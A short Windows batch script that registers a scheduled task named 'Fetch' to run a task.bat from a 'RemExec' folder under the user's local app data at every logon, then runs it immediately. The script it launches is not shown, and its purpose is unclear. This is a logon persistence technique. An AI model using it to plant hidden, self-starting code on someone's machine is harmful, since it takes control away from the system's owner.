@echo off
schtasks /Create /TR "%localappdata%\Programs\RemExec\task.bat" /RU %USERNAME% /TN Fetch /SC ONLOGON /f
schtasks /Run /TN "Fetch"
exit